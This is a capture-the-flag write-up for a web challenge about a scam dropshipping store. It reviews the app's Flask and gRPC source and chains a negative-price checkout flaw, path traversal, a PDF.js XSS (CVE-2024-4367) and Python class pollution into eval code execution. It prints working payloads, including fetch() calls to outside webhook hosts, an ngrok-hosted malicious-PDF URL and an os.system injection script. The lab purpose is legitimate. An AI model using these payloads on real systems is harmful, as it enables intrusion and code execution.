# Web

## Description

A group of known scammers are using a decoy dropshipping course site for cloaking payments from their other fraudulent sites. As you browse through it to look for more details you notice a small programming bug, that could lead to way bigger impact than initially expected. Keep looking for more vulnerabilities and take this greasy operation down.
## Solution

`Dockerfile`: is install curl 7.70.0, which has 44 vulnerabilities: [https://curl.se/docs/vuln-7.70.0.html](https://curl.se/docs/vuln-7.70.0.html)
It's also installing specific version of Firefox/gecko driver, but nothing on that so far.
```bash
FROM python:3.12-slim

# Copy flag
COPY flag.txt /flag.txt

# Install necessary packages
RUN apt-get update && apt-get install -y supervisor bash dbus fonts-dejavu-core xvfb libstdc++6 libasound2 libnss3 libnspr4 libsqlite3-0 libgl1-mesa-glx bzip2 libgtk-3-0 gcc g++ make libffi-dev openssl wget file pkg-config zlib1g-dev libssl-dev libcurl4-openssl-dev \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Install curl
ENV CURL_VERSION=7.70.0
RUN wget https://curl.haxx.se/download/curl-${CURL_VERSION}.tar.gz && tar xfz curl-${CURL_VERSION}.tar.gz \
    && cd curl-${CURL_VERSION}/ && ./configure --with-ssl \
    && make -j 16 && make install

# Install a specific version of Firefox
ARG FIREFOX_VERSION=125.0.1
RUN curl -L "https://ftp.mozilla.org/pub/firefox/releases/${FIREFOX_VERSION}/linux-x86_64/en-US/firefox-${FIREFOX_VERSION}.tar.bz2" -o /tmp/firefox.tar.bz2 \
    && tar -xjf /tmp/firefox.tar.bz2 -C /opt/ \
    && chmod +x /opt/firefox/firefox \
    && rm /tmp/firefox.tar.bz2

# Set necessary environment variables
ENV LD_LIBRARY_PATH=/lib:/usr/lib:/usr/local/lib:/opt/firefox
ENV PATH=$PATH:/opt/firefox

# Install Geckodriver
ARG GECKODRIVER_VERSION=0.33.0
RUN curl -L "https://github.com/mozilla/geckodriver/releases/download/v${GECKODRIVER_VERSION}/geckodriver-v${GECKODRIVER_VERSION}-linux64.tar.gz" -o /tmp/geckodriver.tar.gz \
    && tar -xzf /tmp/geckodriver.tar.gz -C /usr/local/bin \
    && chmod +x /usr/local/bin/geckodriver \
    && rm /tmp/geckodriver.tar.gz

# Upgrade pip and setuptools
RUN python -m pip install --upgrade pip setuptools

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app/store

# Add application
COPY src/store .

# Install dependencies
RUN pip install -r requirements.txt

# Switch working environment
WORKDIR /app/product_api

# Add application
COPY src/product_api .

# Install dependencies
RUN pip install -r requirements.txt

# Setup supervisor
COPY conf/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 1337

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# Create database and start supervisord
COPY --chown=root entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

`entrypoint.sh` moves the flag to random location, this suggests that we might need to achieve RCE.
```bash
#!/bin/sh

# Change flag name
mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt

# Secure entrypoint
chmod 600 /entrypoint.sh

# Launch supervisord
/usr/bin/supervisord -c /etc/supervisord.conf
```

`conf/supervisord.conf` runs 2 applications, flask and grpc.
```bash
[supervisord]
user=root
nodaemon=true
logfile=/dev/null
logfile_maxbytes=0
pidfile=/run/supervisord.pid

[program:flask]
command=python /app/store/run.py
user=root
autorestart=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:grpc]
command=python /app/product_api/api.py
user=root
autorestart=true
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
```

`src/store/config.py` contains production configuration details, email is fixed but not password.
```python
class Config(object):
	SECRET_KEY = os.urandom(50).hex()
	ADMIN_EMAIL = "ed@artificialuniversity.htb"
	ADMIN_PASS = os.urandom(32).hex()
```

`src/store/application/blueprints/routes.py` is the heart of the application which is handling all the routes.
```python
import urllib, requests, ast
from io import BytesIO
from flask import request, session, render_template, redirect, Blueprint, current_app, session, send_file

from application.util.database import Database
from application.util.payments import generate_payment_link, get_amount_paid
from application.util.bot import bot_runner
from application.util.curl import get_url_status_code
from application.util.grpc_utils.grpc_helper import ProductClient

web = Blueprint("web", __name__)

@web.route("/", methods=["GET"])
def index():
	if session and session["loggedin"]:
		return render_template("home.html", title="Home", session=session)

	return render_template("home.html", title="Home")

@web.route("/login", methods=["GET", "POST"])
def login():
	if request.method == "GET":
		return render_template("login.html", title="Log-in")

	email = request.form.get("email")
	password = request.form.get("password")

	if not email or not password:
		return render_template("error.html", title="Error", error="Missing parameters"), 400

	db_session = Database()
	user_valid, user_data = db_session.check_user(email, password)

	if not user_valid:
		return render_template("error.html", title="Error", error="Invalid email/password"), 401

	session["loggedin"] = True
	session["user_id"] = user_data.id
	session["email"] = email
	session["role"] = user_data.role

	return redirect("/")

@web.route("/register", methods=["GET", "POST"])
def register():
	if request.method == "GET":
		return render_template("register.html", title="Register")

	email = request.form.get("email")
	password = request.form.get("password")

	if not email or not password:
		return render_template("error.html", title="Error", error="Missing parameters"), 400

	db_session = Database()
	user_valid = db_session.create_user(email, password)

	if not user_valid:
		return render_template("error.html", title="Error", error="User exists"), 401

	return render_template("error.html", title="Success", error="User created"), 200

@web.route("/logout", methods=["GET"])
def logout():
	session.clear()
	return redirect("/")

@web.route("/product/<product_id>", methods=["GET"])
def product(product_id):
	if not session.get("loggedin"):
		return render_template("error.html", title="Error", error="Must have an account in order to purchase"), 200

	db_session = Database()
	product = db_session.get_product_data(product_id)

	if not product:
		return redirect("/")

	return render_template("product.html", title=product.title, product=product)

@web.route("/subs", methods=["GET"])
def subs():
	if not session.get("loggedin"):
		return redirect("/")

	db_session = Database()
	orders = db_session.get_user_orders(session["user_id"])
	return render_template("subs.html", title="My subscriptions", orders=orders), 200

@web.route("/checkout", methods=["GET"])
def checkout():
	product_id = request.args.get("product_id")
	
	if product_id and not session.get("loggedin"):
		return render_template("error.html", title="Error", error="Must have an account in order to purchase"), 200

	price = request.args.get("price")
	title = request.args.get("title")
	user_id = request.args.get("user_id")
	email = request.args.get("email")

	if not product_id and (not price or not title or not user_id or not email):
		return render_template("error.html", title="Error", error="Missing external order details"), 400

	db_session = Database()
	payment_link = None

	if product_id:
		product_data = db_session.get_product_data(product_id)
		
		if not product_data:
			return render_template("error.html", title="Error", error="Product not found"), 404

		payment_link, payment_id = generate_payment_link(product_data.price)
		order_id = db_session.create_order(product_data.title, session.get("user_id"), session.get("email"), product_data.price, payment_id, product_data.id)
		db_session.generate_invoice(order_id)

	else:
		product_data = {
			"title": title,
			"price": int(price)
		}

		payment_link, payment_id = generate_payment_link(product_data["price"])
		order_id = db_session.create_order(title, user_id, email, int(price), payment_id)
		db_session.generate_invoice(order_id)

	return redirect(payment_link)

@web.route("/checkout/success", methods=["GET"])
def checkout_success():
	order_id = request.args.get("order_id")
	payment_id = request.args.get("payment_id")

	if not order_id:
		return render_template("error.html", title="Error", error="Missing parameters"), 401	
	
	db_session = Database()
	order = db_session.get_order(order_id)
	amt_paid = get_amount_paid(payment_id)

	if amt_paid >= order.price:
		db_session.mark_order_complete(order_id)

	else:
		return render_template("error.html", title="Error", error="Could not complete order"), 401
	
	bot_runner(current_app.config["ADMIN_EMAIL"], current_app.config["ADMIN_PASS"], payment_id)
	return render_template("success.html", title="Order successful", nav=True)

@web.route("/admin", methods=["GET"])
def admin():
	if not session.get("loggedin") or session.get("role") != "admin":
		return redirect("/")

	return render_template("admin_home.html", title="Admin panel", session=session)

@web.route("/admin/users", methods=["GET"])
def admin_users():
	if not session.get("loggedin") or session.get("role") != "admin":
		return redirect("/")

	db_session = Database()
	users = db_session.get_all_users()

	return render_template("admin_users.html", title="Admin panel - Users", session=session, users=users)

@web.route("/admin/products", methods=["GET"])
def admin_products():
	if not session.get("loggedin") or session.get("role") != "admin":
		return redirect("/")

	db_session = Database()
	products = db_session.get_all_products()
	return render_template("admin_products.html", title="Admin panel - Products", session=session, products=products)

@web.route("/admin/orders", methods=["GET"])
def admin_orders():
	if not session.get("loggedin") or session.get("role") != "admin":
		return redirect("/")

	db_session = Database()
	orders = db_session.get_all_orders()

	return render_template("admin_orders.html", title="Admin panel - Orders", session=session, orders=orders)

@web.route("/admin/view-pdf", methods=["GET"])
def admin_view_pdf():
	if not session.get("loggedin") or session.get("role") != "admin":
		return redirect("/")

	pdf_url = request.args.get("url")
	
	if not pdf_url:
		return render_template("error.html", title="Error", error="Missing PDF URL"), 400
	
	try:
		response = requests.get(pdf_url)
		response.raise_for_status()
		
		if response.headers["Content-Type"] != "application/pdf":
			return render_template("error.html", title="Error", error="URL does not point to a PDF file"), 400
		
		pdf_data = BytesIO(response.content)
		return send_file(pdf_data, mimetype="application/pdf", as_attachment=False, download_name="document.pdf")

	except requests.RequestException as e:
		return render_template("error.html", title="Error", error=str(e)), 400

@web.route("/admin/api-health", methods=["GET", "POST"])
def api_health():
	if not session.get("loggedin") or session.get("role") != "admin":
		return redirect("/")
		
	if request.method == "GET":
		return render_template("admin_api_health.html", title="Admin panel - API health", session=session)

	url = request.form.get("url")

	if not url:
		return render_template("error.html", title="Error", error="Missing URL"), 400

	status_code = get_url_status_code(url)
	return render_template("admin_api_health.html", title="Admin panel - API health", session=session, status_code=status_code)

@web.route("/admin/product-stream", methods=["GET"])
def product_stream():
	if not session.get("loggedin") or session.get("role") != "admin":
		return redirect("/")

	client = ProductClient()
	new_products = client.get_new_products()
	products_dict = [{
		"id": product.id,
		"name": product.name,
		"description": product.description,
		"price": product.price
	} for product in new_products]

	return render_template("admin_product_stream.html", title="Admin panel - Product stream", session=session, products=products_dict)

@web.route("/admin/save-product", methods=["GET"])
def save_product():
	if not session.get("loggedin") or session.get("role") != "admin":
		return redirect("/")

	product_dict = request.args.get("product_dict")

	if not product_dict:
		return render_template("error.html", title="Error", error="Missing product data"), 400

	try:
		product_dict = ast.literal_eval(product_dict)
		
		if not isinstance(product_dict, dict):
			return render_template("error.html", title="Error", error="Invalid product"), 400

	except:
		return render_template("error.html", title="Error", error="Invalid product"), 400

	client = ProductClient()
	client.mark_product_saved(product_dict)

	return redirect("/admin/saved-products")

@web.route("/admin/saved-products", methods=["GET"])
def saved_products():
	if not session.get("loggedin") or session.get("role") != "admin":
		return redirect("/")

	client = ProductClient()
	products = client.get_saved_products()

	return render_template("admin_saved_products.html", title="Admin panel - Saved products", session=session, products=products)
```

| Path                    | Methods       | Description                                                   |
| ----------------------- | ------------- | ------------------------------------------------------------- |
| "/"                     | "GET"         | Serves the `home.html` file                                   |
| "/login"                | "GET", "POST" | Logs in the user                                              |
| "/register"             | "GET", "POST" | Registers the user                                            |
| "/logout"               | "GET"         | Logs out the user                                             |
| "/product/<product_id>" | "GET"         | Gets product by ID, if it doesnt exist redirects to `/`       |
| "/subs"                 | "GET"         | Shows subscriptions                                           |
| "/checkout"             | "GET"         | Let's user place order, `product_id` is passed via GET params |
| "/checkout/success"     | "GET"         | Validates the checkout                                        |
| "/admin"                | "GET"         | Admin panel                                                   |
| "/admin/users"          | "GET"         | Shows all users                                               |
| "/admin/products"       | "GET"         | Shows all products                                            |
| "/admin/orders"         | "GET"         | Shows all orders                                              |
| "/admin/view-pdf"       | "GET"         | Shows pdf via GET param `url`                                 |
| "/admin/api-health"     | "GET", "POST" | Shows api health                                              |
| "/admin/product-stream" | "GET"         | Shows product stream                                          |
| "/admin/save-product"   | "GET"         | Saves product via GET params `product_dict`                   |
| "/admin/saved-products" | "GET"         | Shows saved products                                          |

`src/store/application/util/database.py` contains the SQLAlchemy logic, all queries are prepared statements so no SQLi. The `generate_invoice` does seem vulnerable since we could control `payment_id` which will lead to LFI (?)
```python
	def generate_invoice(self, order_id):
		order = self.session.query(Orders).filter(Orders.id == order_id).first()
		if not order:
			return False

		user = self.session.query(Users).filter(Users.id == order.user_id).first()
		product = self.session.query(Products).filter(Products.id == order.product_id).first()

		if not user or not product:
			return False

		pdf = PDFInvoice()
		pdf.add_page()
		pdf.invoice_body(order, user, product)
		pdf_file_path = f"/app/store/application/static/invoices/invoice_{order.payment_id}.pdf"
		pdf.output(pdf_file_path)

		return pdf_file_path
```

`checkout_success` could allow manipulation of the variable.
```python
@web.route("/checkout/success", methods=["GET"])
def checkout_success():
	order_id = request.args.get("order_id")
	payment_id = request.args.get("payment_id")

	if not order_id:
		return render_template("error.html", title="Error", error="Missing parameters"), 401	
	
	db_session = Database()
	order = db_session.get_order(order_id)
	amt_paid = get_amount_paid(payment_id)

	if amt_paid >= order.price:
		db_session.mark_order_complete(order_id)

	else:
		return render_template("error.html", title="Error", error="Could not complete order"), 401
	
	bot_runner(current_app.config["ADMIN_EMAIL"], current_app.config["ADMIN_PASS"], payment_id)
	return render_template("success.html", title="Order successful", nav=True)
```

`src/store/application/util/payments.py` contains dummy implementation so the order might never get through...
```python
import uuid
from urllib.parse import urlparse, parse_qs

def generate_payment_link(amt):
    # Dummy implementation to generate a payment link
    payment_id = str(uuid.uuid4())
    payment_link = f"https://dummy-payment-processor.htb/pay?amount={amt}&payment_id={payment_id}"
    return payment_link, payment_id

def get_amount_paid(payment_id):
    # Dummy implementation to get payment status
    return 0
```

`src/store/application/util/bot.py` opens Firefox, logs onto the main page, requests pdf and then exits after 10 seconds.
```python
import time
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service

def bot_runner(email, password, payment_id):
    firefox_options = Options()

    firefox_binary_path = "/opt/firefox/firefox"
    geckodriver_path = "/usr/local/bin/geckodriver"

    firefox_options.add_argument("--headless")
    firefox_options.binary_location = firefox_binary_path

    firefox_service = Service(geckodriver_path)
    client = webdriver.Firefox(service=firefox_service, options=firefox_options)

    try:
        client.get("http://127.0.0.1:1337/login")
        time.sleep(3)

        client.find_element(By.ID, "email").send_keys(email)
        client.find_element(By.ID, "password").send_keys(password)
        client.execute_script("document.getElementById('login-btn').click()")
        time.sleep(3)

        client.get(f"http://127.0.0.1:1337/static/invoices/invoice_{payment_id}.pdf")
        time.sleep(10)
    finally:
        client.quit()
```

Looks like it's possible to perform XSS via PDF: [Stored XSS in PDF Viewer](https://medium.com/@osamaavvan/stored-xss-in-pdf-viewer-9cc5b955de2b)

[CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367): _A type check was missing when handling fonts in PDF.js, which would allow arbitrary JavaScript execution in the PDF.js context. This vulnerability affects Firefox < 126, Firefox ESR < 115.11, and Thunderbird < 115.11._

Firefox version (which bot uses) is `125` so vulnerability must still exist.

There is no way for us to upload a PDF, but in `checkout` there's a logical error, where if no product is passed, but price/title/user_id/email exists the order is created for us. We can control the `title` variable, but not `price` (int conversion will throw an error).

![artificialuniversity.png](/assets/ctf/htb/web/artificialuniversity.png)

```bash
└─$ curl $'http://83.136.255.217:50447/checkout?price=1&title=<img+srx%3dx+onerror%3dfetch(\'https%3a//uwuos.free.beeceptor.com\')/>&user_id=2&email=test02%40test02.test02' -b $'session=.eJyrVkrNTczMUbJSKkktLjEwcoBQehBKSUcpJz89PTUlM0_JqqSoNFVHqSg_JxWourQ4tQgoC6LiM1OUrIxqAZcfGHA.ZvlmQA.gcd5JG8SmQfJE9YoZrU5GYs9zbM'

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="https://dummy-payment-processor.htb/pay?amount=1&amp;payment_id=9d99e978-4a7c-431f-9ad1-abf043a45ad6">https://dummy-payment-processor.htb/pay?amount=1&amp;payment_id=9d99e978-4a7c-431f-9ad1-abf043a45ad6</a>. If not, click the link.
```

![artificialuniversity-1.png](/assets/ctf/htb/web/artificialuniversity-1.png)

Now to trigger the bot we need price to be lower then 0 and then bot should trigger the XSS.

```bash
└─$ curl $'http://83.136.255.217:50447/checkout?price=-1&title=<img+srx%3dx+onerror%3dfetch(\'https%3a//uwuos.free.beeceptor.com\')/>&user_id=2&email=test02%40test02.test02' -b $'session=.eJyrVkrNTczMUbJSKkktLjEwcoBQehBKSUcpJz89PTUlM0_JqqSoNFVHqSg_JxWourQ4tQgoC6LiM1OUrIxqAZcfGHA.ZvlmQA.gcd5JG8SmQfJE9YoZrU5GYs9zbM'
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="https://dummy-payment-processor.htb/pay?amount=-1&amp;payment_id=1fe1ba2a-c567-4375-be6a-1828a723139d">https://dummy-payment-processor.htb/pay?amount=-1&amp;payment_id=1fe1ba2a-c567-4375-be6a-1828a723139d</a>. If not, click the link.

└─$ curl $'http://83.136.255.217:50447/checkout/success?order_id=8&payment_id=1fe1ba2a-c567-4375-be6a-1828a723139d' -b $'session=.eJyrVkrNTczMUbJSKkktLjEwcoBQehBKSUcpJz89PTUlM0_JqqSoNFVHqSg_JxWourQ4tQgoC6LiM1OUrIxqAZcfGHA.ZvlmQA.gcd5JG8SmQfJE9YoZrU5GYs9zbM'
...
<h1 class="text-green-500 text-2xl font-bold">[Message]</h1>
<span class="text-white text-xl font-semibold">Your order was completed successfully, thank you.</span>
...
```

> Note: Just realized I have a typo in `src`, lol

This sadly won't work, because we are not passing `product_id` it's defaulting to 1, and `generate_invoice` uses product with this ID.
```python
def create_order(self, product_title, user_id, user_email, price, payment_id, product_id=1):
	new_order = Orders(product_title=product_title, user_id=user_id, user_email=user_email, price=price, payment_id=payment_id, product_id=product_id)
	...
	
def generate_invoice(self, order_id):
	...
	product = self.session.query(Products).filter(Products.id == order.product_id).first()
	...
```

Because product is changed we no longer can influence `Title` variable for XSS
```python
def invoice_body(self, order, user, product):
	self.set_font("Arial", "", 12)
	self.cell(0, 10, f"Order ID: {order.id}", 0, 1)
	self.cell(0, 10, f"Payment ID: {order.payment_id}", 0, 1)
	self.cell(0, 10, f"Date: {order.date_created.strftime("%Y-%m-%d")}", 0, 1)
	self.cell(0, 10, f"User: {user.email}", 0, 1)
	self.cell(0, 10, f"Product: {product.title}", 0, 1)
	self.cell(0, 10, f"Price: ${order.price}", 0, 1)
	self.cell(0, 10, f"Completed: {"Yes" if order.completed else "No"}", 0, 1)
```

![artificialuniversity-2.png](/assets/ctf/htb/web/artificialuniversity-2.png)

There are too many actions so automate  them:
```python
from bs4 import BeautifulSoup as BS
from itsdangerous import base64_decode
from zlib import decompress
import json
import requests

class Routes:
    BASE = 'http://83.136.255.217:50447'
    REGISTER = f'{BASE}/register'
    LOGIN = f'{BASE}/login'
    CHECKOUT = f'{BASE}/checkout'
    APPROVE = f'{CHECKOUT}/success'
    SUBS = f'{BASE}/subs'

with requests.Session() as session:
    # session.proxies = {'http': 'http://127.0.0.1:8080'}
    data = {
        'email': '<img src=x onerror="fetch(`https://webhook.site/57b66e9e-66f3-4328-85b8-2d1090fec6e9/?uwu=yes`)" />@letme.in',
        'password': 'letmein'
    }
    session.post(Routes.REGISTER, data=data)
    session.post(Routes.LOGIN, data=data)
    session_dict = json.loads(decompress(base64_decode(session.cookies['session'])).decode())
    params = {
        'price': '-1',
        'title': 'letmein',
        'user_id': session_dict['user_id'],
        'email': data['email']
    }
    session.get(Routes.CHECKOUT, params=params, allow_redirects=False)

    resp = session.get(Routes.SUBS)
    order_details = BS(resp.text, 'html.parser').find('table').find_all('tr')[-1].find_all('td')
    order_id = order_details[0].get_text(strip=True)
    payment_id = order_details[2].get_text(strip=True)
    
    params = {
        'order_id': order_id, 
        'payment_id': payment_id
    }
    session.get(Routes.APPROVE, params=params)
```

Welp... this again will not work. The previous XSS CVE is about injecting the payload inside the `FontMatrix`, not document text. This means we have to somehow include our own PDF into the challenge and we kinda already do that. If we change the last request `payment_id` to be RFI payload we will be able to include the files we desire.

We will need help of the application, especially `admin` route to get our malicious PDF.
```python
@web.route("/admin/view-pdf", methods=["GET"])
def admin_view_pdf():
	if not session.get("loggedin") or session.get("role") != "admin":
		return redirect("/")

	pdf_url = request.args.get("url")
	
	if not pdf_url:
		return render_template("error.html", title="Error", error="Missing PDF URL"), 400
	
	try:
		response = requests.get(pdf_url)
		response.raise_for_status()
		
		if response.headers["Content-Type"] != "application/pdf":
			return render_template("error.html", title="Error", error="URL does not point to a PDF file"), 400
		
		pdf_data = BytesIO(response.content)
		return send_file(pdf_data, mimetype="application/pdf", as_attachment=False, download_name="document.pdf")

	except requests.RequestException as e:
		return render_template("error.html", title="Error", error=str(e)), 400
```

Script updated with some details:
```python
from bs4 import BeautifulSoup as BS
from base64 import urlsafe_b64decode
from zlib import decompress
import json
import requests

class Routes:
    BASE = 'http://94.237.53.113:54015'
    REGISTER = f'{BASE}/register'
    LOGIN = f'{BASE}/login'
    CHECKOUT = f'{BASE}/checkout'
    APPROVE = f'{CHECKOUT}/success'
    SUBS = f'{BASE}/subs'

AUTH = { 'email': 'let@me.in', 'password': 'letmein' }

with requests.Session() as session:
    # session.proxies = {'http': 'http://127.0.0.1:8080'}
    session.post(Routes.REGISTER, data=AUTH)
    session.post(Routes.LOGIN, data=AUTH)

    session_cookie = session.cookies['session'].split('.')[0]
    session_dict = json.loads(urlsafe_b64decode(session_cookie).decode())

    params = {
        'price': '-1',
        'title': 'letmein',
        'user_id': session_dict['user_id'],
        'email': session_dict['email']
    }
    session.get(Routes.CHECKOUT, params=params, allow_redirects=False)

    resp = session.get(Routes.SUBS)
    order_details = BS(resp.text, 'html.parser').find('table').find_all('tr')[-1].find_all('td')
    order_id = order_details[0].get_text(strip=True)
    payment_id = order_details[2].get_text(strip=True)
    
    params = {
        'order_id': order_id, 
        'payment_id': 'x/../../../admin/view-pdf?url=https://xxxxx.ngrok-free.app/poc.pdf#'
    }
    session.get(Routes.APPROVE, params=params)
```

Stealing session cookies is somewhat impossible:

![artificialuniversity-3.png](/assets/ctf/htb/web/artificialuniversity-3.png)

Because `HttpOnly` is True:

![artificialuniversity-4.png](/assets/ctf/htb/web/artificialuniversity-4.png)

With XSS we can now target `/admin/*` endpoints, but blindly..

Admin endpoints have access to GRPC, via `ProductClient` class.

```python
import grpc, threading, time
import application.util.grpc_utils.product_pb2 as product_pb2
import application.util.grpc_utils.product_pb2_grpc as product_pb2_grpc

class ProductClient:
	def __init__(self, host="127.0.0.1", port=50051):
		self.channel = grpc.insecure_channel(f"{host}:{port}")
		self.stub = product_pb2_grpc.ProductServiceStub(self.channel)
		self.new_products = []

	def get_new_products(self):
		response = self.stub.GetNewProducts(product_pb2.Empty())
		return response.products

	def mark_product_saved(self, product):
		product_message = product_pb2.Product(
			id=product["id"],
			name=product["name"],
			description=product["description"],
			price=product["price"]
		)
		return self.stub.MarkProductSaved(product_message)
		
	def get_saved_products(self):
		response = self.stub.GetSavedProducts(product_pb2.Empty())
		return response.products
```

`src/product_api/product.proto` describes the calls and message types in a nutshell.
```proto
syntax = "proto3";

package product;

service ProductService {
    rpc GetNewProducts(Empty) returns (Products);
    rpc MarkProductSaved(Product) returns (Empty);
    rpc GetSavedProducts(Empty) returns (Products);
    rpc DebugService(MergeRequest) returns (Empty);
}

message Empty {}

message Product {
    string id = 1;
    string name = 2;
    string description = 3;
    double price = 4;
}

message Products {
    repeated Product products = 1;
}

message MergeRequest {
    map<string, InputValue> input = 1;
}

message InputValue {
    string string_value = 1;
    double double_value = 2;
    InputValue nested_value = 3;
}
```

`src/product_api/api.py` is the GRPC server. 
```python
import time, product_pb2, product_pb2_grpc, random, uuid, grpc, sys
from concurrent import futures

class ProductService(product_pb2_grpc.ProductServiceServicer):
	def __init__(self):
		self.saved_products = []
		self.max_products = 3
		self.min_price = 10
		self.max_price = 100

	def UpdateService(self, source, destination):
		for key, value in source.items(): 
			if hasattr(destination, "__dict__") and key in destination.__dict__ and isinstance(value, dict): 
				self.UpdateService(value, destination.__dict__[key]) 
			elif hasattr(destination, "__dict__"): 
				destination.__dict__[key] = value 
			elif isinstance(destination, dict) and key in destination and isinstance(value, dict): 
				self.UpdateService(value, destination[key]) 
			else: 
				destination[key] = value

	def GenerateProduct(self):
		if hasattr(self, "price_formula"):
			price = eval(self.price_formula)
			product = product_pb2.Product(
				id=str(uuid.uuid4()),
				name=f"Product {random.randint(1, 100)}",
				description="A sample product",
				price=price
			)
			return product

		else:
			product = product_pb2.Product(
				id=str(uuid.uuid4()),
				name=f"Product {random.randint(1, 100)}",
				description="A sample product",
				price=random.uniform(self.min_price, self.max_price)
			)
			return product

	def GetNewProducts(self, request, context):
		new_products = []
		for i in range(random.randint(0, 3)):
			new_products.append(self.GenerateProduct())
		return product_pb2.Products(products=new_products)

	def MarkProductSaved(self, request, context):
		if len(self.saved_products) >= self.max_products:
			self.saved_products.pop(0)
		self.saved_products.append(request)
		return product_pb2.Empty()

	def GetSavedProducts(self, request, context):
		return product_pb2.Products(products=self.saved_products)

	def DebugService(self, request, context):
		input_dict = {k: v.string_value for k, v in request.input.items()}
		self.UpdateService(input_dict, self)
		return product_pb2.Empty()

def serve():
	server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
	product_pb2_grpc.add_ProductServiceServicer_to_server(ProductService(), server)
	server.add_insecure_port("[::]:50051")
	server.start()
	server.wait_for_termination()

if __name__ == "__main__":
	serve()
```

Right away we can spot the vulnerability [Class Pollution (Python's Prototype Pollution)](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution#basic-vulnerability-example)
```python
	def UpdateService(self, source, destination):
		for key, value in source.items(): 
			if hasattr(destination, "__dict__") and key in destination.__dict__ and isinstance(value, dict): 
				self.UpdateService(value, destination.__dict__[key]) 
			elif hasattr(destination, "__dict__"): 
				destination.__dict__[key] = value 
			elif isinstance(destination, dict) and key in destination and isinstance(value, dict): 
				self.UpdateService(value, destination[key]) 
			else: 
				destination[key] = value
```

But only `DebugService` method has access to it.
```python
	def DebugService(self, request, context):
		input_dict = {k: v.string_value for k, v in request.input.items()}
		self.UpdateService(input_dict, self)
		return product_pb2.Empty()
```

```bash
➜ cp ..\src\product_api\product_pb2* .
➜ py -m venv venv
➜ .\venv\Scripts\activate
➜ pip install grpcio grpcio-tools bs4 beautifulsoup4 requests
➜ py ..\src\product_api\api.py
```

Run the server and the client side by side for debug.

Client:
```python
import grpc
import product_pb2
import product_pb2_grpc

def run():
    channel = grpc.insecure_channel('localhost:50051')
    stub = product_pb2_grpc.ProductServiceStub(channel)

    input_values = {
        # "price_formula": product_pb2.InputValue(string_value="2+2"),
        "price_formula": product_pb2.InputValue(string_value="__import__('os').system('dir')"),
    } 

    merge_request = product_pb2.MergeRequest(input=input_values)

    raw_request = merge_request.SerializeToString()
    print("Raw Request Bytes:", raw_request)

    response = stub.DebugService(merge_request)
    print(response)
    response = stub.GetNewProducts(merge_request)
    print(response)

if __name__ == "__main__":
    run()
```

![artificialuniversity-5.png](/assets/ctf/htb/web/artificialuniversity-5.png)

`UpdateService` allows us to pollute the object itself.

We can't send any nested objects, because it's taking only `string_value` from objects. But this is useful for `GenerateProduct` which is checking if object has `price_formula`, this property doesn't exist, yet. We can use prototype pollution to injected this value and because `eval` is dangerous function inject some malicious python code in there too.
```python
def GenerateProduct(self):
	if hasattr(self, "price_formula"):
		price = eval(self.price_formula)
		product = product_pb2.Product(
			id=str(uuid.uuid4()),
			name=f"Product {random.randint(1, 100)}",
			description="A sample product",
			price=price
		)
		return product
```

